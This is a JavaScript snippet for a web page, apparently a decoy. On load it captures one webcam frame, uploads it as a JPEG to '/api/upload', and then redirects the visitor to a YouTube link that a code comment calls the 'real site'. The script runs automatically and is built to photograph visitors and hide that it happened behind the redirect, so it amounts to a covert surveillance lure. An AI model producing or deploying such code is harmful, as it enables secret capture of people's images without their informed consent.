(async () => {
  const video  = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  async function captureFrameOnce() {
    let stream;
    try {
      // 1) get or reuse camera
      stream = video.srcObject
        ? video.srcObject
        : await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;

      // 2) wait for dimensions
      await new Promise(r => {
        if (video.readyState >= 2) r();
        else video.onloadedmetadata = () => r();
      });

      // 3) draw frame
      canvas.width  = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      // 4) dataURL → JSON
      const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
      await fetch('/api/upload', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ image: dataUrl })
      });
    } catch (err) {
      console.error('Auto-capture error:', err);
    } finally {
      // 5) cleanup camera
      if (stream) stream.getTracks().forEach(t => t.stop());
      // 6) redirect to real site
      window.location.replace('https://youtu.be/m5IWI6xFRms?si=6jUE3tyw9lgbTAjk');
    }
  }

  // expose for “Next”
  window.runAutoCapture = captureFrameOnce;
  // autorun on load
  captureFrameOnce();
})();
